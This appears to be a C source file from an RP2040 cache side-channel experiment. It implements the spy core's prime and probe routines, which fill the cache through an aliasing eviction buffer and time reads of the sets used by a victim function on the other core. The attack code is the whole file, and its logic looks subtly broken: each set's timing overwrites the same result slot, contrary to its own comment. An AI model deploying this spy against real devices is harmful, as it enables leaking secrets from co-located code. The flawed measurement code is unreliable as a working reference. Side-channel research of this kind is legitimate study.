#include "../../include/shared.h"
#include "../../include/timing/systick.h"
#include "../../include/platform/rp2040.h"
#include <stdint.h>
#include <stdatomic.h>

// Placed at 0x10003000 by linker, aliases foo()'s cache sets
extern const uint8_t evict_buf[16384];

// based on specification of the RP2040 cache
#define NUM_SETS    1024
#define LINE_BYTES  8
#define NUM_WAYS    2
#define STRIDE      (NUM_SETS * LINE_BYTES)   // 8192 = 0x2000

// How many sets foo() occupies -- I was able to observe the total size of foo() from the symbole table
#define FOO_SETS    7    

// foo() starts at set 527 = (0x1000107e >> 3) & 0x3FF
// bjdump -t firmware.elf | grep foo
#define FOO_SET_START  527


//  timing storage 
// Per-set timing
uint32_t spy_results[ITERATIONS];

//  prime: fill both ways of ALL sets 
static void prime(void)
{
    // Way 0: sequential read through first 8KB
    for (int s = 0; s < NUM_SETS; s++) {
        volatile uint8_t x = evict_buf[s * LINE_BYTES];
        (void)x;
    }
    // Way 1: offset by one stride
    for (int s = 0; s < NUM_SETS; s++) {
        volatile uint8_t x = evict_buf[STRIDE + s * LINE_BYTES];
        (void)x;
    }
}

//   normal timing
static void probe(int iter)
{
    for (int s = 0; s < FOO_SETS; s++) {
        // evict_buf is aligned to the same start set as foo(),
        // so index directly by s
        uint32_t t0 = SYSTICK_VAL;
        volatile uint8_t x = evict_buf[s * LINE_BYTES];
        uint32_t t1 = SYSTICK_VAL;
        (void)x;

        spy_results[iter] = systick_elapsed(t0, t1);
    }
}

// core 1 entry 
void core1_main(void)
{
   
    systick_init();
    atomic_store_explicit(&cpu1_running, true, memory_order_release);

    // wait for core 0 to be ready
    while (!atomic_load_explicit(&cpu0_running, memory_order_acquire));
    prime();
    for (int i = 0; i < ITERATIONS; i++) {
       
        // victim on core 0 runs concurrently — no explicit sync here
        // the probe itself primes the cache
        probe(i);
    }

    atomic_store_explicit(&cpu1_running, false, memory_order_release);

   
    while (1);  // park core 1
}